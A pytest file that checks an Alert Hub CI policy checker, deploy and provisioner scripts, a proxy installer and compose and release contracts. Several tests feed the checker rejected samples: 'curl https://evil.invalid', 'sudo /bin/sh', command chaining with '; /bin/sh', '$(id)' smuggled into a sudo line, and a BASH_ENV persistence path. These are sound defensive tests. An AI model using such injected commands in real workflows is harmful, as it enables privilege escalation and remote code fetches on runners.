from __future__ import annotations

import importlib.util
import json
import re
import shutil
import subprocess
from pathlib import Path
from types import ModuleType
from typing import Any

import yaml

REPOSITORY = Path(__file__).resolve().parents[2]
CHECKER_PATH = REPOSITORY / "deploy" / "scripts" / "check-ci-policy.py"
CODEQL_GATE_PATH = REPOSITORY / "deploy" / "scripts" / "check-codeql-sarif.py"
DEPLOY_ENGINE_PATH = REPOSITORY / ".github" / "deploy" / "scripts" / "docker-deploy-node.sh"
PROVISIONER_PATH = REPOSITORY / ".github" / "deploy" / "scripts" / "docker-provision-node.sh"
PROXY_INSTALLER_PATH = REPOSITORY / "deploy" / "scripts" / "install-proxy-config.sh"
PIN = "0123456789abcdef0123456789abcdef01234567"


def _checker() -> ModuleType:
    spec = importlib.util.spec_from_file_location("check_ci_policy", CHECKER_PATH)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def _codeql_gate() -> ModuleType:
    spec = importlib.util.spec_from_file_location("check_codeql_sarif", CODEQL_GATE_PATH)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def _write_ci(tmp_path: Path, body: str) -> Path:
    workflows = tmp_path / ".github" / "workflows"
    workflows.mkdir(parents=True)
    (workflows / "ci.yml").write_text(body, encoding="utf-8")
    (tmp_path / ".github" / "CODEOWNERS").write_text(
        """\
* @owner
/.github/deploy/ @owner
/.github/workflows/ @owner
/backend/migrations/ @owner
/backend/Dockerfile @owner
/deploy/ @owner
/docker-compose*.yml @owner
/frontend/Dockerfile @owner
/AGENTS.md @owner
""",
        encoding="utf-8",
    )
    (tmp_path / "AGENTS.md").write_text(
        """\
# Alert Hub agent guide
## Product invariants
## Security rules
## Tests and definition of done
""",
        encoding="utf-8",
    )
    return tmp_path


def _workflow(name: str) -> dict[str, Any]:
    document = yaml.safe_load(
        (REPOSITORY / ".github" / "workflows" / name).read_text(encoding="utf-8")
    )
    assert isinstance(document, dict)
    return document


def _compose(path: str) -> dict[str, Any]:
    document = yaml.safe_load((REPOSITORY / path).read_text(encoding="utf-8"))
    assert isinstance(document, dict)
    return document


def _job_run(job: dict[str, Any]) -> str:
    return "\n".join(
        str(step.get("run", "")) for step in job.get("steps", []) if isinstance(step, dict)
    )


def _job_actions(job: dict[str, Any]) -> list[str]:
    return [
        str(step["uses"])
        for step in job.get("steps", [])
        if isinstance(step, dict) and "uses" in step
    ]


def _shell_function(source: str, name: str) -> str:
    match = re.search(rf"(?ms)^{re.escape(name)}\(\) \{{\n.*?^\}}$", source)
    assert match is not None, f"missing shell function: {name}"
    return match.group(0)


def _assert_order(source: str, *fragments: str) -> None:
    cursor = -1
    for fragment in fragments:
        position = source.find(fragment, cursor + 1)
        assert position >= 0, f"missing ordered shell fragment: {fragment}"
        assert position > cursor
        cursor = position


def _run_restore_harness(*arguments: str) -> list[str]:
    source = DEPLOY_ENGINE_PATH.read_text(encoding="utf-8")
    definitions, marker, _entrypoint = source.partition("[[ ${EUID} -eq 0 ]]")
    assert marker
    quoted_arguments = " ".join(f"'{argument}'" for argument in arguments)
    harness = (
        definitions
        + """
stop_component_containers() { printf 'stop:%s\\n' "$1"; }
activate_config_snapshot() { printf 'activate:%s\\n' "$1"; }
apply_target() { printf 'apply:%s:%s:%s:%s\\n' "$1" "$2" "$3" "$4"; }
remove_active_config() { printf 'remove\\n'; }
"""
        + f"restore_recorded_deployment {quoted_arguments}\n"
    )
    result = subprocess.run(
        ["bash"],
        input=harness,
        check=True,
        capture_output=True,
        text=True,
    )
    return result.stdout.splitlines()


def _provisioner_definitions() -> str:
    source = PROVISIONER_PATH.read_text(encoding="utf-8")
    definitions, marker, _entrypoint = source.partition("[[ ${EUID} -eq 0 ]]")
    assert marker
    return definitions


def _run_runner_validation(groups: str) -> subprocess.CompletedProcess[str]:
    harness = (
        _provisioner_definitions()
        + f"""
getent() {{ return 0; }}
id() {{
  case "$1" in
    -u) printf '1001\\n' ;;
    -nG) printf '%s\\n' '{groups}' ;;
    *) return 2 ;;
  esac
}}
validate_runner_user alert-runner
"""
    )
    return subprocess.run(
        ["bash"],
        input=harness,
        capture_output=True,
        check=False,
        text=True,
    )


def _run_compose_file_selection(monitoring_network: str) -> list[str]:
    source = DEPLOY_ENGINE_PATH.read_text(encoding="utf-8")
    definitions, marker, _entrypoint = source.partition("[[ ${EUID} -eq 0 ]]")
    assert marker
    harness = (
        definitions
        + f"""
MONITORING_NETWORK='{monitoring_network}'
require_root_controlled_file() {{ :; }}
validate_monitoring_network() {{ :; }}
configure_compose_files
printf '%s\\n' "${{COMPOSE_FILES[@]}}"
"""
    )
    result = subprocess.run(
        ["bash"],
        input=harness,
        check=True,
        capture_output=True,
        text=True,
    )
    return result.stdout.splitlines()


def _run_monitoring_network_validation(
    network_name: str,
    *,
    driver: str = "bridge",
    scope: str = "local",
    internal: str = "false",
    masquerade: str = "true",
    inter_container: str = "true",
    subnets: str = "172.31.240.0/24",
) -> subprocess.CompletedProcess[str]:
    harness = (
        _provisioner_definitions()
        + r"""
TEST_NAME=$1
TEST_DRIVER=$2
TEST_SCOPE=$3
TEST_INTERNAL=$4
TEST_MASQUERADE=$5
TEST_INTER_CONTAINER=$6
TEST_SUBNETS=$7
docker() {
  if (($# == 3)); then
    return 0
  fi
  case ${5:-} in
    *'.Driver'*) printf '%s\n' "${TEST_DRIVER}" ;;
    *'.Scope'*) printf '%s\n' "${TEST_SCOPE}" ;;
    *'.Internal'*) printf '%s\n' "${TEST_INTERNAL}" ;;
    *'enable_ip_masquerade'*) printf '%s\n' "${TEST_MASQUERADE}" ;;
    *'enable_icc'*) printf '%s\n' "${TEST_INTER_CONTAINER}" ;;
    *'.IPAM.Config'*) printf '%s\n' "${TEST_SUBNETS}" ;;
    *) return 2 ;;
  esac
}
validate_monitoring_network "${TEST_NAME}"
"""
    )
    return subprocess.run(
        [
            "bash",
            "-s",
            "--",
            network_name,
            driver,
            scope,
            internal,
            masquerade,
            inter_container,
            subnets,
        ],
        input=harness,
        capture_output=True,
        check=False,
        text=True,
    )


def _run_exact_network_validation(actual: list[str], expected: list[str]) -> int:
    status_path = REPOSITORY / ".github/deploy/scripts/docker-status-node.sh"
    source = status_path.read_text(encoding="utf-8")
    definitions, marker, _entrypoint = source.partition("[[ ${EUID} -eq 0 ]]")
    assert marker
    harness = (
        definitions
        + r"""
ACTUAL_NETWORKS=$1
shift
docker() { printf '%s\n' "${ACTUAL_NETWORKS}"; }
container_has_exact_networks alert-hub-test "$@"
"""
    )
    result = subprocess.run(
        ["bash", "-s", "--", "\n".join(actual), *expected],
        input=harness,
        capture_output=True,
        check=False,
        text=True,
    )
    return result.returncode


def _run_boundary_restore_harness(
    temporary_directory: Path,
    existing_destination: Path,
    existing_backup: Path,
    new_destination: Path,
    missing_backup: Path,
) -> subprocess.CompletedProcess[str]:
    harness = (
        _provisioner_definitions()
        + r"""
temporary_directory=$1
existing_destination=$2
existing_backup=$3
new_destination=$4
missing_backup=$5
BOUNDARY_DESTINATIONS=("${existing_destination}" "${new_destination}")
BOUNDARY_MODES=(600 600)
BOUNDARY_BACKUPS=("${existing_backup}" "${missing_backup}")
BOUNDARY_EXISTED=(true false)
install() {
  local mode source destination
  while (($#)); do
    case $1 in
      -o | -g) shift 2 ;;
      -m) mode=$2; shift 2 ;;
      --) shift; break ;;
      *) break ;;
    esac
  done
  source=$1
  destination=$2
  command cp -- "${source}" "${destination}"
  chmod "${mode}" "${destination}"
}
visudo() { :; }
restore_boundary
"""
    )
    return subprocess.run(
        [
            "bash",
            "-s",
            "--",
            str(temporary_directory),
            str(existing_destination),
            str(existing_backup),
            str(new_destination),
            str(missing_backup),
        ],
        input=harness,
        capture_output=True,
        check=False,
        text=True,
    )


def _run_proxy_installer_harness(
    tmp_path: Path, *, validator_exit: int | None
) -> tuple[subprocess.CompletedProcess[str], Path, str]:
    source = PROXY_INSTALLER_PATH.read_text(encoding="utf-8")
    root_guard = '[[ ${EUID} -eq 0 ]] || die "run as root"'
    privileged_install = 'install -o root -g root -m 0644 "${candidate}" "${destination}"'
    assert source.count(root_guard) == 1
    assert source.count(privileged_install) == 1
    source = source.replace(root_guard, ": # root check exercised by production invocation")
    source = source.replace(
        privileged_install,
        'install -m 0644 "${candidate}" "${destination}"',
    )

    harness = tmp_path / "install-proxy-config.sh"
    harness.write_text(source, encoding="utf-8")
    fake_bin = tmp_path / "bin"
    fake_bin.mkdir()
    for command in (
        "basename",
        "chmod",
        "cp",
        "date",
        "dirname",
        "grep",
        "install",
        "mktemp",
        "rm",
        "sed",
    ):
        executable = shutil.which(command)
        assert executable is not None
        (fake_bin / command).symlink_to(executable)
    if validator_exit is not None:
        validator = fake_bin / "nginx"
        validator.write_text(f"#!/bin/sh\nexit {validator_exit}\n", encoding="utf-8")
        validator.chmod(0o755)

    template = tmp_path / "proxy.template"
    template.write_text(
        "server=__SERVER_NAME__ upstream=__UPSTREAM__ trusted=__TRUSTED_PROXY_CIDR__\n",
        encoding="utf-8",
    )
    destination = tmp_path / "alert-hub.conf"
    original = "# Managed by Alert Hub\nold proxy config\n"
    destination.write_text(original, encoding="utf-8")
    bash = shutil.which("bash")
    assert bash is not None
    result = subprocess.run(
        [
            bash,
            str(harness),
            "nginx",
            str(template),
            str(destination),
            "--server-name",
            "alerts.example.com",
            "--upstream",
            "127.0.0.1:8080",
            "--trusted-proxy",
            "127.0.0.1/32",
        ],
        capture_output=True,
        check=False,
        env={"PATH": str(fake_bin)},
        text=True,
    )
    return result, destination, original


def test_ci_policy_accepts_read_only_main_pr_with_sha_pin(tmp_path: Path) -> None:
    repository = _write_ci(
        tmp_path,
        f"""\
name: CI
on:
  pull_request:
    branches: [main]
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@{PIN}
        with:
          persist-credentials: false
""",
    )

    assert _checker().check_repository(repository) == []


def test_ci_policy_rejects_broad_trigger_and_unpinned_action(tmp_path: Path) -> None:
    repository = _write_ci(
        tmp_path,
        """\
name: CI
on:
  pull_request:
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v4
""",
    )

    failures = _checker().check_repository(repository)

    assert any("exactly [main]" in failure for failure in failures)
    assert any("full commit SHA" in failure for failure in failures)


def test_ci_policy_rejects_pr_write_but_allows_push_only_write(tmp_path: Path) -> None:
    repository = _write_ci(
        tmp_path,
        """\
name: CI
on:
  pull_request:
    branches: [main]
permissions:
  contents: read
jobs:
  unsafe:
    runs-on: ubuntu-24.04
    permissions:
      contents: write
    steps: []
  publish:
    if: github.event_name == 'push'
    runs-on: ubuntu-24.04
    permissions:
      packages: write
    steps: []
""",
    )

    failures = _checker().check_repository(repository)

    assert len(failures) == 1
    assert "unsafe" in failures[0]
    assert "contents" in failures[0]


def test_ci_policy_requires_codeowners_for_sensitive_boundaries(tmp_path: Path) -> None:
    repository = _write_ci(
        tmp_path,
        """\
name: CI
on:
  pull_request:
    branches: [main]
permissions:
  contents: read
jobs: {}
""",
    )
    (repository / ".github" / "CODEOWNERS").write_text("* @owner\n", encoding="utf-8")

    failures = _checker().check_repository(repository)

    assert any("/.github/deploy/" in failure for failure in failures)
    assert any("/.github/workflows/" in failure for failure in failures)
    assert any("/backend/Dockerfile" in failure for failure in failures)
    assert any("/docker-compose*.yml" in failure for failure in failures)
    assert any("/frontend/Dockerfile" in failure for failure in failures)
    assert any("/AGENTS.md" in failure for failure in failures)


def test_ci_policy_rejects_repository_code_at_self_hosted_root_boundary(
    tmp_path: Path,
) -> None:
    repository = _write_ci(
        tmp_path,
        """\
name: CI
on:
  pull_request:
    branches: [main]
permissions:
  contents: read
jobs: {}
""",
    )
    (repository / ".github" / "workflows" / "deploy.yml").write_text(
        f"""\
name: Unsafe deploy
on:
  push:
  workflow_dispatch:
permissions:
  contents: read
jobs:
  deploy:
    runs-on: [self-hosted, alert-hub-ru]
    steps:
      - uses: actions/checkout@{PIN}
        with:
          persist-credentials: false
      - run: |
          sudo install .github/deploy/scripts/docker-deploy-node.sh /usr/local/sbin/
          sudo /usr/local/sbin/docker-deploy-node.sh
""",
        encoding="utf-8",
    )

    failures = _checker().check_repository(repository)

    assert any("workflow_dispatch-only" in failure for failure in failures)
    assert any("must not check out repository code" in failure for failure in failures)
    assert any("must not install or execute repository" in failure for failure in failures)
    assert any("may sudo only" in failure for failure in failures)


def test_ci_policy_accepts_only_exact_no_argument_root_wrappers() -> None:
    checker = _checker()
    accepted = [
        "sudo /usr/local/sbin/docker-status-node.sh",
        "sudo --preserve-env=NODE_NAME,NODE_IP /usr/local/sbin/docker-deploy-node.sh",
        "sudo --preserve-env=ALERT_HUB_ROLLBACK_VERSION,ALERT_HUB_CONFIRMATION "
        "/usr/local/sbin/docker-rollback-node.sh",
    ]
    rejected = [
        "sudo /bin/sh",
        "sudo -u root /usr/local/sbin/docker-status-node.sh",
        "sudo --preserve-env=BASH_ENV /usr/local/sbin/docker-deploy-node.sh",
        "sudo --preserve-env=NODE_NAME,NODE_NAME /usr/local/sbin/docker-deploy-node.sh",
        "sudo --preserve-env= /usr/local/sbin/docker-deploy-node.sh",
        "sudo /usr/local/sbin/docker-deploy-node.sh --force",
        "sudo /usr/local/sbin/docker-status-node.sh; /bin/sh",
        "sudo /usr/local/sbin/docker-status-node.sh$(id)",
        "sudo ./docker-deploy-node.sh",
    ]

    assert all(checker._is_allowed_root_wrapper(command) for command in accepted)
    assert not any(checker._is_allowed_root_wrapper(command) for command in rejected)


def test_ci_policy_rejects_obfuscated_commands_on_self_hosted_runners() -> None:
    checker = _checker()
    environment = {
        "NODE_IP": "fixture",
        "PUBLIC_DOMAIN": "fixture",
        "PEER_ADDRESS": "fixture",
    }
    prologue = (
        f"{checker.SELF_HOSTED_SHELL_OPTIONS}\n"
        "for required in NODE_IP PUBLIC_DOMAIN PEER_ADDRESS; do\n"
        f"  {checker.REQUIRED_VALUE_CHECK}\n"
        "done\n"
    )
    assert checker._is_allowed_self_hosted_run(
        prologue + "sudo /usr/local/sbin/docker-deploy-node.sh\n",
        environment,
    )
    assert checker._is_allowed_self_hosted_run(
        "sudo /usr/local/sbin/docker-status-node.sh\n",
        {},
    )

    rejected = [
        prologue + "sud''o /bin/sh\n" + "sudo /usr/local/sbin/docker-deploy-node.sh\n",
        "echo sudo /usr/local/sbin/docker-status-node.sh\n",
        "# sudo /usr/local/sbin/docker-status-node.sh\n",
        prologue + "sudo /usr/local/sbin/docker-deploy-node.sh; /bin/sh\n",
        prologue.replace("done\n", "done\ncurl https://evil.invalid\n")
        + "sudo /usr/local/sbin/docker-deploy-node.sh\n",
    ]
    assert not any(checker._is_allowed_self_hosted_run(run, environment) for run in rejected)


def test_ci_policy_rejects_shell_and_environment_injection_on_self_hosted_runner(
    tmp_path: Path,
) -> None:
    repository = _write_ci(
        tmp_path,
        """\
name: CI
on:
  pull_request:
    branches: [main]
permissions:
  contents: read
jobs: {}
""",
    )
    (repository / ".github" / "workflows" / "deploy.yml").write_text(
        """\
name: Unsafe deploy shell
on:
  workflow_dispatch:
defaults:
  run:
    shell: bash -c 'curl https://evil.invalid' _ {0}
permissions:
  contents: read
jobs:
  deploy:
    runs-on: [self-hosted, alert-hub-ru]
    defaults:
      run:
        shell: bash -c 'id' _ {0}
    steps:
      - shell: bash -c 'env' _ {0}
        env:
          BASH_ENV: /tmp/runner-persistence
        run: sudo /usr/local/sbin/docker-status-node.sh
""",
        encoding="utf-8",
    )

    failures = _checker().check_repository(repository)

    assert any("workflow-level defaults.run.shell" in failure for failure in failures)
    assert any("must not override defaults.run.shell" in failure for failure in failures)
    assert any("untrusted step shell" in failure for failure in failures)
    assert any("unsupported step environment: BASH_ENV" in failure for failure in failures)


def test_ci_policy_rejects_dynamic_or_out_of_boundary_self_hosted_runners(
    tmp_path: Path,
) -> None:
    repository = _write_ci(
        tmp_path,
        """\
name: CI
on:
  pull_request:
    branches: [main]
permissions:
  contents: read
jobs: {}
""",
    )
    (repository / ".github" / "workflows" / "rogue.yml").write_text(
        """\
name: Rogue runners
on:
  workflow_dispatch:
permissions:
  contents: read
jobs:
  dynamic:
    strategy:
      matrix:
        runner: [self-hosted]
    runs-on: ${{ matrix.runner }}
    steps: []
  direct:
    runs-on: [self-hosted, alert-hub-ru]
    steps: []
""",
        encoding="utf-8",
    )

    failures = _checker().check_repository(repository)

    runner_failures = [failure for failure in failures if "approved static" in failure]
    assert len(runner_failures) == 2
    assert any("dynamic" in failure for failure in runner_failures)
    assert any("direct" in failure for failure in runner_failures)


def test_public_proxy_examples_hide_operator_only_endpoints() -> None:
    nginx = (REPOSITORY / "nginx.conf.example").read_text(encoding="utf-8")
    caddy = (REPOSITORY / "Caddyfile.example").read_text(encoding="utf-8")

    assert "metrics|health/deep|api/" in nginx
    assert "openapi\\.json" in nginx
    assert "@operator_only path /metrics /health/deep" in caddy
    assert "/api/docs" in caddy
    assert "/api/redoc" in caddy
    assert "/api/openapi.json" in caddy
    assert "respond @operator_only 404" in caddy


def test_proxy_installer_missing_validator_does_not_replace_active_config(
    tmp_path: Path,
) -> None:
    result, destination, original = _run_proxy_installer_harness(tmp_path, validator_exit=None)

    assert result.returncode == 1
    assert "error: nginx is not installed" in result.stderr
    assert destination.read_text(encoding="utf-8") == original
    assert list(tmp_path.glob("alert-hub.conf.bak.*")) == []


def test_proxy_installer_validation_failure_restores_active_config(
    tmp_path: Path,
) -> None:
    result, destination, original = _run_proxy_installer_harness(tmp_path, validator_exit=1)

    assert result.returncode == 1
    assert "proxy validation failed; original configuration restored" in result.stderr
    assert destination.read_text(encoding="utf-8") == original
    backups = list(tmp_path.glob("alert-hub.conf.bak.*"))
    assert len(backups) == 1
    assert backups[0].read_text(encoding="utf-8") == original


def test_publish_flows_reuse_both_exact_tested_images() -> None:
    ci = _workflow("ci.yml")
    jobs = ci["jobs"]
    assert "bundle-image" not in jobs
    api = jobs["api-image"]
    web = jobs["web-image"]
    integration = jobs["container-integration"]
    candidate = ci["jobs"]["candidate"]
    api_run = _job_run(api)
    web_run = _job_run(web)
    integration_run = _job_run(integration)
    candidate_run = _job_run(candidate)

    api_needs = api["needs"] if isinstance(api["needs"], list) else [api["needs"]]
    assert "frontend" not in api_needs
    assert "--file backend/Dockerfile" in api_run
    assert "--tag alert-hub-api:ci" in api_run
    assert "docker save alert-hub-api:ci" in api_run
    assert "--file frontend/Dockerfile" in web_run
    assert "--tag alert-hub-web:ci" in web_run
    assert "docker save alert-hub-web:ci" in web_run
    assert "ci-image-matrix-smoke.sh" in integration_run
    assert "alert-hub-api:ci alert-hub-web:ci" in integration_run
    assert "ci-three-node-failure.sh alert-hub-api:ci" in integration_run
    assert not re.search(r"(?m)^\s*docker build(?:x)?(?:\s|$)", candidate_run)
    for local_image in ("alert-hub-api:ci", "alert-hub-web:ci"):
        assert f"docker tag {local_image}" in candidate_run
    assert candidate_run.count("docker push") == 2
    assert "docker manifest inspect" in candidate_run
    assert "Refusing to move immutable candidate tag" in candidate_run
    assert "Could not prove candidate tag is absent" in candidate_run
    assert 'api_state=$(candidate_state "${api_candidate}"' in candidate_run
    assert 'web_state=$(candidate_state "${web_candidate}"' in candidate_run
    assert "alert-hub:ci" not in candidate_run
    assert any(
        action.startswith("actions/download-artifact@") for action in _job_actions(candidate)
    )

    release = _workflow("release.yml")["jobs"]["release"]
    release_run = _job_run(release)
    build_commands = re.findall(r"(?m)^\s*docker build(?:x)?(?:\s|$)", release_run)
    assert len(build_commands) == 2
    assert "--file backend/Dockerfile" in release_run
    assert "--file frontend/Dockerfile" in release_run
    assert "ci-image-matrix-smoke.sh" in release_run
    assert "alert-hub-api:release alert-hub-web:release" in release_run
    assert "ci-three-node-failure.sh alert-hub-api:release" in release_run
    for local_image in (
        "alert-hub-api:release",
        "alert-hub-web:release",
    ):
        assert local_image in release_run
    assert "release-manifest.json" in release_run
    assert "compatible_pairs" in release_run
    assert "Refusing to move immutable release tag" in release_run
    assert release_run.count("assert_tag_absent") >= 4
    assert "API_REF" in release_run
    assert "WEB_REF" in release_run
    assert "BUNDLE_REF" not in release_run
    assert "alert-hub:release" not in release_run
    actions = _job_actions(release)
    assert sum(action.startswith("anchore/sbom-action@") for action in actions) == 2
    assert sum(action.startswith("actions/attest-build-provenance@") for action in actions) == 2


def test_compose_contract_has_only_independent_api_and_web_images() -> None:
    default = _compose("docker-compose.yml")
    split = _compose("docker-compose.split.yml")
    api_only = _compose("docker-compose.api-only.yml")
    production = _compose(".github/deploy/docker-compose.production.yml")
    production_monitoring = _compose(".github/deploy/docker-compose.production-monitoring.yml")

    for model in (default, split, production):
        services = model["services"]
        assert set(services) == {"alert-hub", "alert-hub-web"}
        assert services["alert-hub"]["image"].startswith("${ALERT_HUB_API_IMAGE:")
        assert services["alert-hub-web"]["image"].startswith("${ALERT_HUB_WEB_IMAGE:")
        assert services["alert-hub"]["environment"]["BACKEND_PORT"] == "8080"
        assert services["alert-hub-web"]["depends_on"]["alert-hub"]["condition"] == (
            "service_healthy"
        )

    for model in (default, split):
        api = model["services"]["alert-hub"]
        web = model["services"]["alert-hub-web"]
        assert api["build"] == {
            "context": "backend",
            "dockerfile": "Dockerfile",
            "args": api["build"]["args"],
        }
        assert web["build"] == {
            "context": "frontend",
            "dockerfile": "Dockerfile",
            "args": web["build"]["args"],
        }
        assert model["networks"]["edge"]["internal"] is True
        assert set(api["networks"]) == {"edge", "egress"}
        assert set(web["networks"]) == {"edge", "ingress"}
        assert model["networks"]["ingress"] == {}

    assert set(api_only["services"]) == {"alert-hub"}
    assert api_only["services"]["alert-hub"]["build"]["context"] == "backend"
    assert "build" not in production["services"]["alert-hub"]
    assert "build" not in production["services"]["alert-hub-web"]
    assert production["services"]["alert-hub"]["ports"] == [
        "${ALERT_HUB_PEER_ADDRESS:?set the private peer bind address}:8080:8080"
    ]
    assert production["services"]["alert-hub-web"]["ports"] == [
        "127.0.0.1:${ALERT_HUB_HOST_PORT:-8080}:8080"
    ]
    assert set(production["services"]["alert-hub"]["networks"]) == {
        "edge",
        "egress",
    }
    assert "monitoring" not in production["networks"]
    assert production["networks"]["egress"] == {
        "name": "alert-hub-egress",
        "driver": "bridge",
    }
    assert production_monitoring == {
        "services": {"alert-hub": {"networks": {"monitoring": {}}}},
        "networks": {
            "monitoring": {
                "external": True,
                "name": "${MONITORING_NETWORK:?set the existing monitoring network}",
            }
        },
    }
    assert not (REPOSITORY / "Dockerfile").exists()
    assert not (REPOSITORY / "Dockerfile.api").exists()


def test_repository_quality_checks_each_split_runtime_boundary() -> None:
    quality = _workflow("ci.yml")["jobs"]["repository-quality"]
    run = _job_run(quality)

    for path in (
        "backend/container/entrypoint.sh",
        "frontend/container/entrypoint.sh",
        "frontend/container/render-ui-runtime.sh",
        ".github/deploy/scripts/docker-provision-node.sh",
        ".github/deploy/scripts/docker-deploy-node.sh",
        ".github/deploy/scripts/docker-rollback-node.sh",
        ".github/deploy/scripts/docker-status-node.sh",
    ):
        assert path in run
    assert "docker buildx build --check --file backend/Dockerfile backend" in run
    assert "docker buildx build --check --file frontend/Dockerfile frontend" in run
    assert "deploy/container/render-ui-runtime.py" not in run
    assert "Dockerfile.api" not in run


def test_release_manifest_binds_the_exact_api_web_pair() -> None:
    release = _workflow("release.yml")["jobs"]["release"]
    run = _job_run(release)

    assert "compatibility: $compatibility" in run
    assert "api: $api_ref" in run
    assert "web: $web_ref" in run
    assert 'component: "api", version: $version' in run
    assert 'component: "web", version: $version' in run
    assert ".compatible_pairs[0].api == .images.api.reference" in run
    assert ".compatible_pairs[0].web == .images.web.reference" in run
    assert ".compatible_pairs[0].compatibility == .compatibility" in run
    assert '((.images | keys) == ["api", "web"])' in run
    assert ".images.bundle" not in run
    assert "sha256sum release-manifest.json" in run


def test_web_only_production_deploy_does_not_receive_crypto_secrets() -> None:
    deploy = _workflow("deploy.yml")
    crypto_secrets = {
        "CLUSTER_MASTER_KEY",
        "SESSION_SIGNING_KEY",
        "VAPID_PRIVATE_KEY",
    }

    for job_name in ("deploy_ru", "deploy_nl", "deploy_de"):
        steps = deploy["jobs"][job_name]["steps"]
        web_step = next(step for step in steps if step.get("if") == "inputs.component == 'web'")
        api_step = next(step for step in steps if step.get("if") == "inputs.component != 'web'")
        status_step = next(
            step
            for step in steps
            if "/usr/local/sbin/docker-status-node.sh" in str(step.get("run", ""))
        )
        web_step_text = str(web_step)
        api_step_text = str(api_step)

        assert crypto_secrets.isdisjoint(web_step["env"])
        assert crypto_secrets <= api_step["env"].keys()
        assert crypto_secrets.isdisjoint(status_step.get("env", {}))
        for secret in crypto_secrets:
            assert secret not in web_step_text
            assert secret in api_step_text
        assert "/usr/local/sbin/docker-deploy-node.sh" in str(web_step["run"])
        assert "/usr/local/sbin/docker-deploy-node.sh" in str(api_step["run"])
        assert "/usr/local/sbin/docker-status-node.sh" in str(status_step["run"])


def test_production_network_topology_comes_from_root_owned_policy() -> None:
    deploy = (REPOSITORY / ".github/deploy/scripts/docker-deploy-node.sh").read_text(
        encoding="utf-8"
    )
    status = (REPOSITORY / ".github/deploy/scripts/docker-status-node.sh").read_text(
        encoding="utf-8"
    )
    topology_keys = {
        "HOST_PORT",
        "EDGE_SUBNET",
        "API_IP",
        "WEB_IP",
        "MONITORING_NETWORK",
    }

    assert "DEPLOY_POLICY_FILE=/etc/alert-hub/deploy-policy.env" in deploy
    assert "deployment policy EDGE_SUBNET" in deploy
    assert "usable_address_in_cidr" in deploy
    assert "validate_managed_network_if_present" in deploy
    assert "PEER_ADDRESS must not overlap" in deploy
    assert "172.31.254." not in deploy
    assert "readonly HOST_PORT=8080" not in deploy
    for key in topology_keys:
        assert f'${{DEPLOY_POLICY_FILE}}" {key}' in deploy
        assert key in status
    assert "load_status_policy" in status
    assert "readonly HOST_PORT=8080" not in status


def test_production_monitoring_override_is_selected_only_when_configured() -> None:
    base = ["--file", "/etc/alert-hub/docker-compose.production.yml"]
    assert _run_compose_file_selection("") == base
    assert _run_compose_file_selection("existing-monitoring") == [
        *base,
        "--file",
        "/etc/alert-hub/docker-compose.production-monitoring.yml",
    ]

    deploy = DEPLOY_ENGINE_PATH.read_text(encoding="utf-8")
    status = (REPOSITORY / ".github/deploy/scripts/docker-status-node.sh").read_text(
        encoding="utf-8"
    )
    assert 'required["MONITORING_NETWORK"] = 1' not in deploy
    assert 'required["MONITORING_NETWORK"] = 1' not in status
    assert "monitoring=disabled" in status
    assert "monitoring=attached" in status


def test_node_provisioner_rejects_docker_group_and_writes_narrow_sudoers(
    tmp_path: Path,
) -> None:
    rejected = _run_runner_validation("alert-runner docker")
    accepted = _run_runner_validation("alert-runner operators")
    assert rejected.returncode == 1
    assert "must not belong to the docker group" in rejected.stderr
    assert accepted.returncode == 0

    sudoers = tmp_path / "sudoers"
    harness = _provisioner_definitions() + 'write_sudoers_candidate "$1" alert-runner\n'
    subprocess.run(["bash", "-s", "--", str(sudoers)], input=harness, check=True, text=True)
    sudoers_text = sudoers.read_text(encoding="utf-8")
    assert sudoers.stat().st_mode & 0o777 == 0o440
    assert "env_reset" in sudoers_text
    assert "secure_path=/usr/sbin:/usr/bin:/sbin:/bin" in sudoers_text
    assert "env_keep +=" in sudoers_text
    assert "BASH_ENV" not in sudoers_text
    assert "SETENV" not in sudoers_text
    assert 'NOPASSWD: /usr/local/sbin/docker-deploy-node.sh ""' in sudoers_text
    assert 'NOPASSWD: /usr/local/sbin/docker-rollback-node.sh ""' in sudoers_text
    assert 'NOPASSWD: /usr/local/sbin/docker-status-node.sh ""' in sudoers_text
    assert "docker-provision-node.sh" not in sudoers_text
    visudo = shutil.which("visudo")
    if visudo is not None:
        validation = subprocess.run(
            [visudo, "-cf", str(sudoers)],
            capture_output=True,
            check=False,
            text=True,
        )
        assert validation.returncode == 0, validation.stderr

    source = PROVISIONER_PATH.read_text(encoding="utf-8")
    assert "visudo -cf" in source
    assert "--token" not in source
    assert "GH_TOKEN" not in source
    assert "RUNNER_TOKEN" not in source
    assert "config.sh" not in source
    assert source.startswith("#!/bin/bash\n")
    assert "require_root_directory_chain" in source
    assert 'require_root_controlled_file "${SOURCE_ROOT}/${relative_path}"' in source


def test_node_provisioner_policy_omits_optional_monitoring_when_disabled(
    tmp_path: Path,
) -> None:
    without_monitoring = tmp_path / "without-monitoring.env"
    with_monitoring = tmp_path / "with-monitoring.env"
    harness = (
        _provisioner_definitions()
        + 'write_policy_candidate "$1" Example/alert-hub ru 8080 '
        + '10.253.251.0/29 10.253.251.2 10.253.251.3 "$2"\n'
    )
    subprocess.run(
        ["bash", "-s", "--", str(without_monitoring), ""],
        input=harness,
        check=True,
        text=True,
    )
    subprocess.run(
        ["bash", "-s", "--", str(with_monitoring), "existing-monitoring"],
        input=harness,
        check=True,
        text=True,
    )
    assert "MONITORING_NETWORK" not in without_monitoring.read_text(encoding="utf-8")
    assert "MONITORING_NETWORK=existing-monitoring" in with_monitoring.read_text(encoding="utf-8")


def test_monitoring_network_must_be_an_egress_capable_user_bridge() -> None:
    assert _run_monitoring_network_validation("monitoring").returncode == 0
    for built_in in ("bridge", "host", "none"):
        rejected = _run_monitoring_network_validation(built_in)
        assert rejected.returncode == 1
        assert "user-defined bridge" in rejected.stderr

    cases = (
        ({"driver": "overlay"}, "non-internal local bridge"),
        ({"scope": "swarm"}, "non-internal local bridge"),
        ({"internal": "true"}, "non-internal local bridge"),
        ({"masquerade": "false"}, "masqueraded outbound traffic"),
        ({"inter_container": "false"}, "API-to-monitoring traffic"),
        ({"subnets": "fd00::/64"}, "IPv4 subnet"),
    )
    for overrides, expected_error in cases:
        rejected = _run_monitoring_network_validation("monitoring", **overrides)
        assert rejected.returncode == 1
